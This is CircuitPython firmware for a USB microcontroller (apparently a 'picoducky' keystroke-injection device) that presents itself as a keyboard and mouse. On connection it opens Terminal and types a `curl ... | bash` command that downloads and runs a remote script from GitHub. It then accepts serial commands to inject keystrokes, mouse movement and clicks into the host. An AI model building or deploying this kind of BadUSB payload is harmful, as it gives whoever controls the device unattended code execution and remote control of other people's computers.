import time
import usb_cdc  # type: ignore
import usb_hid  # type: ignore
from adafruit_hid.keyboard import Keyboard  # type: ignore
from adafruit_hid.keycode import Keycode  # type: ignore
from adafruit_hid.mouse_abs import Mouse  # type: ignore
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS  # type: ignore

MAGIC_SEQUENCE = b"\x4a\x42\x67\x41"
BOOTSTRAP_URL = "https://raw.githubusercontent.com/JBlitzar/picoducky/refs/heads/main/cc-src/bootstrap.sh"

ser = usb_cdc.data

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
mouse = Mouse(usb_hid.devices)

SYM_TO_MOD = {
    "⌘": Keycode.GUI,
    "⇧": Keycode.SHIFT,
    "⌥": Keycode.ALT,
    "⌃": Keycode.CONTROL,
}

# Normalized name -> Keycode mapping for explicit press/release protocol
NAME_TO_KEYCODE = {
    # modifiers
    "SHIFT": Keycode.SHIFT,
    "CONTROL": Keycode.CONTROL,
    "CTRL": Keycode.CONTROL,
    "ALT": Keycode.ALT,
    "GUI": Keycode.GUI,
    # specials
    "ENTER": Keycode.ENTER,
    "RETURN": Keycode.ENTER,
    "TAB": Keycode.TAB,
    "ESC": Keycode.ESCAPE,
    "ESCAPE": Keycode.ESCAPE,
    "SPACE": Keycode.SPACEBAR,
    "SPACEBAR": Keycode.SPACEBAR,
    "BACKSPACE": Keycode.BACKSPACE,
    # arrows
    "UP": getattr(Keycode, "UP_ARROW"),
    "DOWN": getattr(Keycode, "DOWN_ARROW"),
    "LEFT": getattr(Keycode, "LEFT_ARROW"),
    "RIGHT": getattr(Keycode, "RIGHT_ARROW"),
}

# Add F-keys if available
for i in range(1, 25):
    name = f"F{i}"
    if hasattr(Keycode, name):
        NAME_TO_KEYCODE[name] = getattr(Keycode, name)

# Track pressed state to avoid duplicate presses and to properly handle modifiers
_pressed_keys = set()  # non-modifier keycodes currently pressed
_mod_counts = {"SHIFT": 0, "CONTROL": 0, "ALT": 0, "GUI": 0}


def _char_to_keycode(ch: str):
    if len(ch) != 1:
        return None
    if "A" <= ch <= "Z":
        return getattr(Keycode, ch)
    if "a" <= ch <= "z":
        return getattr(Keycode, ch.upper())
    if ch == "0":
        return Keycode.ZERO
    if ch == "1":
        return Keycode.ONE
    if ch == "2":
        return Keycode.TWO
    if ch == "3":
        return Keycode.THREE
    if ch == "4":
        return Keycode.FOUR
    if ch == "5":
        return Keycode.FIVE
    if ch == "6":
        return Keycode.SIX
    if ch == "7":
        return Keycode.SEVEN
    if ch == "8":
        return Keycode.EIGHT
    if ch == "9":
        return Keycode.NINE
    if ch == " ":
        return Keycode.SPACEBAR
    if ch == ",":
        return Keycode.COMMA
    if ch == ".":
        return Keycode.PERIOD
    if ch == "-":
        return Keycode.MINUS
    return None


def type_sequence(seq):
    for token in seq:
        mods = []
        enter = False
        chars = []
        for ch in token:
            if ch in SYM_TO_MOD:
                mods.append(SYM_TO_MOD[ch])
            elif ch == "↩︎":
                enter = True
            else:
                chars.append(ch)

        if enter:
            if mods:
                kbd.press(*mods, Keycode.ENTER)
                kbd.release_all()
            else:
                kbd.press(Keycode.ENTER)
                kbd.release_all()
            time.sleep(0.03)
            continue

        named = "".join(chars).lower()

        # Handle named special keys first (works with or without modifiers)
        special_map = {
            "space": Keycode.SPACEBAR,
            "backspace": Keycode.BACKSPACE,
            "tab": Keycode.TAB,
            "enter": Keycode.ENTER,
            "return": Keycode.ENTER,
            "escape": Keycode.ESCAPE,
            "esc": Keycode.ESCAPE,
        }
        if named in special_map:
            kc = special_map[named]
            if mods:
                kbd.press(*mods, kc)
                kbd.release_all()
            else:
                kbd.press(kc)
                kbd.release_all()
            time.sleep(0.02)
            continue

        if mods and chars:
            for ch in chars:
                kc = _char_to_keycode(ch)
                if kc is None:
                    continue
                kbd.press(*mods, kc)
                kbd.release_all()
                time.sleep(0.02)
            continue

        if not mods and chars:
            layout.write("".join(chars))
            time.sleep(0.02)


_mx = 0
_my = 0


def _send_abs_mouse(x=None, y=None, wheel=0):
    global _mx, _my
    if x is None:
        x = _mx
    if y is None:
        y = _my
    mouse.move(x, y, wheel)
    _mx = x
    _my = y


# Initial bootstrap: open Terminal and run bootstrap script
kbd.press(Keycode.GUI, Keycode.SPACE)
kbd.release_all()
time.sleep(0.05)
layout.write("terminal")
time.sleep(0.5)
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.25)
kbd.press(Keycode.GUI, Keycode.N)
kbd.release_all()
time.sleep(0.1)
# Cache-bust the bootstrap URL so we always fetch the latest script
cb = str(int(time.monotonic() * 1000))
layout.write(f"curl -sSL '{BOOTSTRAP_URL}?t={cb}' | bash")
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.8)

# Center the mouse
mouse.move(16384, 16384, 0)
# Track last absolute position so wheel/clicks don't jump to 0,0
_mx = 16384
_my = 16384

# Wait for host to open the serial port
while not ser.connected:
    time.sleep(0.05)

ser.write(b"READY\n")

buffer = bytearray()
while True:
    if ser.in_waiting:
        chunk = ser.read(ser.in_waiting)
        if chunk:
            buffer.extend(chunk)
    # process full lines
    if b"\n" in buffer or b"\r" in buffer:
        for sep in (b"\r\n", b"\n", b"\r"):
            if sep in buffer:
                line, _, rest = buffer.partition(sep)
                buffer = bytearray(rest)
                try:
                    if not line.startswith(MAGIC_SEQUENCE):
                        break
                    payload = line[len(MAGIC_SEQUENCE) :].decode("utf-8", "replace")
                    parts = payload.split(";")
                    cmd = parts[0] if parts else ""
                    if cmd == "mouse" and len(parts) > 1:
                        sx, sy = parts[1].split(",")
                        _send_abs_mouse(int(sx), int(sy), 0)
                    elif cmd in ("mousewheel", "wheel") and len(parts) > 1:
                        _send_abs_mouse(None, None, int(parts[1]))
                    elif cmd == "mouseclick" and len(parts) > 1:
                        btn, pressed = parts[1].split(",")
                        mask = 0
                        if btn in ("1", "left", "LEFT"):
                            mask = Mouse.LEFT_BUTTON
                        elif btn in ("2", "middle", "MIDDLE"):
                            mask = Mouse.MIDDLE_BUTTON
                        elif btn in ("3", "right", "RIGHT"):
                            mask = Mouse.RIGHT_BUTTON
                        if pressed == "1":
                            mouse.press(mask)
                        else:
                            mouse.release(mask)
                    elif cmd == "type" and len(parts) > 1:
                        sequence = "".join(parts[1:]).split(",,")
                        type_sequence(sequence)
                    elif cmd == "key" and len(parts) > 1:
                        try:
                            name, state = parts[1].split(",")
                        except ValueError:
                            name = parts[1]
                            state = "1"
                        nm = name.strip()
                        kc = None
                        if len(nm) == 1:
                            kc = _char_to_keycode(nm)
                        if kc is None:
                            kc = NAME_TO_KEYCODE.get(nm.upper())
                        if kc is not None:
                            mod_name = None
                            up_nm = nm.upper()
                            if up_nm in _mod_counts:
                                mod_name = up_nm
                            if mod_name is not None:
                                # Modifier key with refcount semantics
                                if state == "1":
                                    if _mod_counts[mod_name] == 0:
                                        try:
                                            kbd.press(kc)
                                        except Exception:
                                            pass
                                    _mod_counts[mod_name] += 1
                                else:
                                    if _mod_counts[mod_name] > 0:
                                        _mod_counts[mod_name] -= 1
                                        if _mod_counts[mod_name] == 0:
                                            try:
                                                kbd.release(kc)
                                            except Exception:
                                                pass
                            else:
                                # Non-modifier keys: de-dupe presses
                                if state == "1":
                                    if kc not in _pressed_keys:
                                        try:
                                            kbd.press(kc)
                                            _pressed_keys.add(kc)
                                        except Exception:
                                            pass
                                else:
                                    if kc in _pressed_keys:
                                        try:
                                            kbd.release(kc)
                                        except Exception:
                                            pass
                                        _pressed_keys.discard(kc)
                    elif cmd == "release_all":
                        try:
                            kbd.release_all()
                        except Exception:
                            pass
                        # Reset local state tracking
                        _pressed_keys.clear()
                        for k in _mod_counts:
                            _mod_counts[k] = 0
                except Exception:
                    pass
                break
    time.sleep(0.01)
